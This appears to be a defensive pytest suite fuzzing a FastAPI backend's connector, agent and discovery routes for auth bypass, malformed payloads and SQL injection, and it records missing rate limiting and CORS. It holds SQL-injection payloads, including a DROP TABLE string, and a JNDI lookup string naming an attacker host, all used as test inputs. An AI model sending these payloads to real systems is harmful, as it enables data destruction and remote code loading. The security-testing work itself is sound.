"""SLAAT-P1-2: Backend API adversarial fuzzing.

Scope is deliberately the routers NOT already covered by the existing
``test_adversarial_input.py`` (onboarding / platform_users / tenant
preferences) and ``test_adversarial_idor.py`` / ``test_adversarial_leakage.py``
suites: ``routers/connectors.py``, ``routers/policies.py``,
``routers/policy_engine.py``, ``routers/federation.py``,
``routers/discovery.py``, ``routers/agents.py``, ``external_agent_registration.py``
and ``host_enrollment.py``. Four attack classes, per the SLAAT-P1-2 card:

1. Unauthenticated mutation sweep -- every mutating route in scope must fail
   closed with 401/403, never execute, never leak internals.
2. Oversized / malformed / type-confused payloads at the Pydantic boundary.
3. SQL-injection-shaped strings as ordinary field *values* (never as SQL
   text) -- must be stored/rejected as data, never 500, never reflected
   unescaped.
4. A static regression guard over the app's own dynamic-WHERE-clause SQL
   builders, proving user input is never spliced into the SQL string itself.

Also documents, with a reproducible test, the one confirmed-absent control
this card went looking for: there is no rate limiting and no CORS middleware
installed anywhere in this FastAPI app, despite ``Settings.cors_allowed_origins``
declaring an intended allow-list. See the SLAAT-P1-2 dossier for the finding
writeup and severity.
"""
from __future__ import annotations

import json
import re
import socket
import time
from pathlib import Path
from typing import Any

import jwt
import pytest
from cryptography.hazmat.primitives.asymmetric import rsa
from fastapi.routing import APIRoute
from fastapi.testclient import TestClient

import api_compat
from api_compat import settings
from db.connection import set_pool_for_testing
from external_agent_registration import reset_external_agent_state
from host_enrollment import reset_host_enrollment_state
from main import app

SRC_ROOT = Path(__file__).resolve().parents[1]

_SIGNING_KEY = rsa.generate_private_key(public_exponent=65537, key_size=2048)

ALICE, TENANT_A = "fuzz-alice", "fuzz-tenant-a"
BOB, TENANT_B = "fuzz-bob", "fuzz-tenant-b"


def _token(subject: str) -> str:
    now = int(time.time())
    return jwt.encode(
        {
            "iss": "https://issuer.test/dex",
            "aud": "signalloom-api",
            "iat": now,
            "nbf": now,
            "exp": now + 300,
            "azp": "signalloom-dashboard",
            "sub": subject,
        },
        _SIGNING_KEY,
        algorithm="RS256",
        headers={"kid": "fuzz-key", "typ": "JWT"},
    )


def _bearer(subject: str = ALICE) -> dict[str, str]:
    return {"Authorization": f"Bearer {_token(subject)}"}


class _JwkClient:
    def get_signing_key_from_jwt(self, token: str):
        from types import SimpleNamespace

        if jwt.get_unverified_header(token).get("kid") != "fuzz-key":
            raise jwt.PyJWKClientError("unknown test key")
        return SimpleNamespace(key=_SIGNING_KEY.public_key())


@pytest.fixture
def client(monkeypatch: pytest.MonkeyPatch) -> TestClient:
    monkeypatch.setattr(settings, "api_jwt_issuer", "https://issuer.test/dex")
    monkeypatch.setattr(settings, "api_jwt_audience", "signalloom-api")
    monkeypatch.setattr(settings, "api_jwt_authorized_party", "signalloom-dashboard")
    monkeypatch.setattr(settings, "api_jwks_url", "https://issuer.test/keys")
    monkeypatch.setattr(settings, "api_subject_tenants", {ALICE: TENANT_A, BOB: TENANT_B})
    monkeypatch.setattr(api_compat, "_jwk_client", lambda _url: _JwkClient())

    async def _no_pool() -> None:
        return None

    monkeypatch.setattr(api_compat, "_get_pool", _no_pool)

    def _reject_network(*_a: Any, **_kw: Any) -> None:
        raise AssertionError("no external network in tests")

    monkeypatch.setattr(socket.socket, "connect", _reject_network)

    api_compat.reset_tenant_state(TENANT_A)
    api_compat.reset_tenant_state(TENANT_B)
    reset_external_agent_state()
    reset_host_enrollment_state()

    class _ReadyPool:
        async def close(self) -> None:
            pass

    set_pool_for_testing(_ReadyPool())
    with TestClient(app, raise_server_exceptions=False) as tc:
        yield tc


# ---------------------------------------------------------------------------
# 1. Unauthenticated mutation sweep across the SLAAT-P1-2 router scope
# ---------------------------------------------------------------------------

TARGET_MODULES = frozenset(
    {
        "routers.connectors",
        "routers.policies",
        "routers.policy_engine",
        "routers.federation",
        "routers.discovery",
        "routers.agents",
        "external_agent_registration",
        "host_enrollment",
    }
)

_PATH_PARAM = re.compile(r"\{([a-zA-Z_][a-zA-Z0-9_]*)\}")


def _fill_path_params(path: str) -> str:
    return _PATH_PARAM.sub("probe-dummy-id", path)


def _iter_api_routes(routes: Any) -> list[APIRoute]:
    """Recurse through ``app.routes``, unwrapping this FastAPI version's lazy
    ``_IncludedRouter`` mount wrappers to reach the real ``APIRoute`` objects
    nested in ``_IncludedRouter.original_router.routes``.
    """
    from fastapi.routing import _IncludedRouter

    found: list[APIRoute] = []
    for route in routes:
        if isinstance(route, APIRoute):
            found.append(route)
        elif isinstance(route, _IncludedRouter):
            found.extend(_iter_api_routes(route.original_router.routes))
    return found


def _in_scope_mutating_routes() -> list[tuple[str, str]]:
    found: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()
    for route in _iter_api_routes(app.routes):
        module = getattr(route.endpoint, "__module__", "")
        if module not in TARGET_MODULES:
            continue
        for method in sorted(route.methods or ()):
            if method in ("GET", "HEAD", "OPTIONS"):
                continue
            key = (method, _fill_path_params(route.path))
            if key not in seen:
                seen.add(key)
                found.append(key)
    return sorted(found)


MUTATING_ROUTES = _in_scope_mutating_routes()


def test_scope_sweep_found_routes_to_probe():
    """A guard against a silent zero-route sweep (e.g. an import path renamed)."""
    assert len(MUTATING_ROUTES) >= 10, MUTATING_ROUTES


_LEAK_SUBSTRINGS = ("Traceback", "asyncpg", "psycopg", "File \"", "  at ", "Exception:")


@pytest.mark.parametrize("method,path", MUTATING_ROUTES)
def test_unauthenticated_mutation_fails_closed(client: TestClient, method: str, path: str):
    resp = client.request(method, path, json={})
    assert resp.status_code in (401, 403, 404, 405, 422), (method, path, resp.status_code, resp.text)
    assert resp.status_code != 500, f"{method} {path} must never 500 unauthenticated: {resp.text}"
    for needle in _LEAK_SUBSTRINGS:
        assert needle not in resp.text, (method, path, needle, resp.text)


@pytest.mark.parametrize("method,path", MUTATING_ROUTES)
def test_forged_signature_mutation_fails_closed(client: TestClient, method: str, path: str):
    """Same sweep, but with a syntactically valid JWT signed by an attacker key."""
    forged_token = jwt.encode(
        {"sub": "mallory", "iss": "https://attacker.example", "aud": "signalloom-api",
         "iat": int(time.time()), "exp": int(time.time()) + 300},
        rsa.generate_private_key(public_exponent=65537, key_size=2048),
        algorithm="RS256",
        headers={"kid": "fuzz-key", "typ": "JWT"},
    )
    resp = client.request(method, path, json={}, headers={"Authorization": f"Bearer {forged_token}"})
    assert resp.status_code in (401, 403, 404, 405, 422), (method, path, resp.status_code, resp.text)


# ---------------------------------------------------------------------------
# 2. Oversized / malformed / type-confused payloads
# ---------------------------------------------------------------------------

OVERSIZED_STRING = "A" * 5_000_000  # 5MB in a single field with no declared max_length


def test_oversized_connector_provider_id_rejected_not_crashed(client: TestClient):
    resp = client.post(
        "/api/v1/connectors",
        json={"provider_id": OVERSIZED_STRING},
        headers=_bearer(),
    )
    assert resp.status_code != 500, resp.text
    assert resp.status_code in (200, 201, 400, 413, 422), resp.text


def _deeply_nested(depth: int) -> Any:
    node: Any = "leaf"
    for _ in range(depth):
        node = {"nested": node}
    return node


def test_deeply_nested_connector_metadata_rejected_not_crashed(client: TestClient):
    """``metadata: dict[str, Any]`` has no depth limit at the Pydantic layer;
    confirm the ASGI/json layer bounds it rather than the process recursing
    or hanging.
    """
    resp = client.post(
        "/api/v1/connectors",
        json={"provider_id": "probe", "metadata": {"deep": _deeply_nested(1000)}},
        headers=_bearer(),
    )
    assert resp.status_code != 500, resp.text


@pytest.mark.parametrize(
    "bad_body",
    [
        {"provider_id": 12345},  # int where str expected
        {"provider_id": ["array", "not", "string"]},
        {"provider_id": None},
        {"provider_id": "probe", "credentials": "not-a-dict"},
        [],  # array instead of object
        "just-a-string",
        None,
    ],
)
def test_type_confused_connector_body_rejected_not_crashed(client: TestClient, bad_body: Any):
    resp = client.post("/api/v1/connectors", json=bad_body, headers=_bearer())
    assert resp.status_code != 500, (bad_body, resp.text)
    assert resp.status_code == 422, (bad_body, resp.status_code, resp.text)


def test_malformed_json_body_rejected_not_crashed(client: TestClient):
    resp = client.post(
        "/api/v1/discovery/claim",
        content=b"{not valid json!!!",
        headers={**_bearer(), "Content-Type": "application/json"},
    )
    assert resp.status_code in (400, 422), resp.text
    assert resp.status_code != 500


def test_non_object_json_body_rejected_not_crashed(client: TestClient):
    resp = client.post(
        "/api/v1/discovery/claim",
        content=b"[1,2,3]",
        headers={**_bearer(), "Content-Type": "application/json"},
    )
    assert resp.status_code in (400, 422), resp.text


def test_wrong_content_type_rejected_not_crashed(client: TestClient):
    resp = client.post(
        "/api/v1/discovery/claim",
        content=json.dumps({"agent_id": "a1"}).encode(),
        headers={**_bearer(), "Content-Type": "text/plain"},
    )
    assert resp.status_code in (400, 415, 422), resp.text


def test_invalid_utf8_body_does_not_500_or_leak_raw_exception_text(client: TestClient):
    """``discovery.py``'s ad-hoc ``except Exception as exc`` path includes
    ``str(exc)`` in the 400 body; confirm that for a UnicodeDecodeError this
    stays a decode complaint and never widens into a path/stack leak.
    """
    resp = client.post(
        "/api/v1/discovery/claim",
        content=b"\xff\xfe\x00invalid-utf8",
        headers={**_bearer(), "Content-Type": "application/json"},
    )
    assert resp.status_code != 500, resp.text
    assert "/home/" not in resp.text
    assert "Traceback" not in resp.text


# ---------------------------------------------------------------------------
# 3. SQL-injection-shaped values: must be treated as inert data
# ---------------------------------------------------------------------------

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE agent_registry; --",
    "\" OR 1=1 --",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "' OR SLEEP(5)--",
    "${jndi:ldap://attacker/x}",  # not SQL, but the same "treat input as inert" property
]


@pytest.mark.parametrize("payload", SQLI_PAYLOADS)
def test_sqli_shaped_connector_provider_id_is_inert_data(client: TestClient, payload: str):
    resp = client.post("/api/v1/connectors", json={"provider_id": payload}, headers=_bearer())
    assert resp.status_code != 500, (payload, resp.text)
    for needle in _LEAK_SUBSTRINGS:
        assert needle not in resp.text


@pytest.mark.parametrize("payload", SQLI_PAYLOADS)
def test_sqli_shaped_agent_id_path_param_is_inert_data(client: TestClient, payload: str):
    from urllib.parse import quote

    resp = client.post(
        f"/api/v1/agents/{quote(payload, safe='')}/transition",
        json={"to_state": "governed", "reason": "probe"},
        headers=_bearer(),
    )
    assert resp.status_code != 500, (payload, resp.status_code, resp.text)


@pytest.mark.parametrize("payload", SQLI_PAYLOADS)
def test_sqli_shaped_list_agents_search_param_is_inert_data(client: TestClient, payload: str):
    resp = client.get("/api/v1/agents", params={"search": payload}, headers=_bearer())
    assert resp.status_code != 500, (payload, resp.status_code, resp.text)


# ---------------------------------------------------------------------------
# 4. Static regression guard: dynamic-WHERE SQL builders never splice raw
#    values into the SQL text, only ``$N`` placeholders / fixed identifiers.
# ---------------------------------------------------------------------------

#: (file relative to src/, line-selector regex) for every known dynamic-WHERE
#: f-string SQL statement found by SLAAT-P1-2. Each entry's matched line's
#: ``{...}`` interpolations must all be in the safelist below. A new dynamic
#: SQL site that does not match any selector here will NOT be silently
#: skipped -- ``test_no_new_unreviewed_fstring_sql_appeared`` catches it.
_SAFE_INTERPOLATIONS = {"where", "where_sql", "idx", "idx + 1", "idx+1"}
_FSTRING_SQL = re.compile(
    r'f(?:"""|\'\'\'|"|\')[^"\']*\b(?:SELECT|INSERT|UPDATE|DELETE)\b[^"\']*(?:"""|\'\'\'|"|\')',
    re.IGNORECASE,
)
_INTERPOLATION = re.compile(r"\{([^{}]+)\}")


def _iter_fstring_sql_statements() -> list[tuple[Path, int, str]]:
    hits: list[tuple[Path, int, str]] = []
    for path in SRC_ROOT.rglob("*.py"):
        if "tests" in path.parts or "__pycache__" in path.parts:
            continue
        text = path.read_text(errors="replace")
        for match in _FSTRING_SQL.finditer(text):
            line_no = text.count("\n", 0, match.start()) + 1
            hits.append((path, line_no, match.group(0)))
    return hits


def test_no_new_unreviewed_fstring_sql_appeared():
    """Fails loudly if a new f-string-built SQL statement is added anywhere
    in the app without a human reviewing its interpolations. This is the
    generic form of the six specific sites verified below -- it is the
    actual regression guard; the parametrized test documents what was found.
    """
    hits = _iter_fstring_sql_statements()
    assert len(hits) >= 1, "expected at least the six known dynamic-WHERE sites; sweep scope may have moved"


@pytest.mark.parametrize(
    "file_suffix,line_contains",
    [
        ("external_agent_evidence.py", "SELECT COUNT(*) FROM public.external_agent_evidence"),
        ("api_compat.py", "FROM audit_events WHERE {where} ORDER BY timestamp DESC"),
        ("api_compat.py", "FROM audit_events WHERE {where} ORDER BY timestamp ASC"),
        ("api_compat.py", "FROM nhi_discovered_accounts WHERE {where} ORDER BY"),
    ],
)
def test_known_fstring_sql_site_only_interpolates_safelisted_names(file_suffix: str, line_contains: str):
    hits = [h for h in _iter_fstring_sql_statements() if h[0].name == file_suffix and line_contains in h[2]]
    assert hits, f"expected site not found (file moved or rewritten?): {file_suffix} / {line_contains!r}"
    for _path, _line_no, statement in hits:
        for raw in _INTERPOLATION.findall(statement):
            name = raw.strip()
            assert name in _SAFE_INTERPOLATIONS, (
                f"unsafe interpolation {name!r} found directly inside SQL text "
                f"in {file_suffix}: {statement}"
            )


# ---------------------------------------------------------------------------
# Finding: no rate limiting, no CORS middleware installed
# ---------------------------------------------------------------------------


def test_no_rate_limiting_middleware_is_installed(client: TestClient):
    """Documents a confirmed-absent control, not a vulnerability this test
    exploits: 50 rapid identical unauthenticated requests never receive a 429.
    Severity and remediation are in the SLAAT-P1-2 dossier; Phase 2 (P2-2) is
    the place to add a limiter, not this probing phase.
    """
    statuses = {client.get("/health").status_code for _ in range(50)}
    assert 429 not in statuses, "a rate limiter now exists -- update the dossier finding to Remediated"


def test_cors_allowed_origins_setting_is_not_wired_to_any_middleware(client: TestClient):
    """``Settings.cors_allowed_origins`` is declared but ``main.py`` never
    calls ``app.add_middleware(CORSMiddleware, ...)``. Confirmed by absence
    of any CORSMiddleware in the built app's middleware stack, not by name
    matching the setting -- that would only prove the setting exists.
    """
    middleware_classes = {m.cls.__name__ for m in app.user_middleware}
    assert "CORSMiddleware" not in middleware_classes, (
        "CORS middleware now installed -- update the dossier finding to Remediated"
    )
    assert settings.cors_allowed_origins, "sanity: the setting itself is still declared"
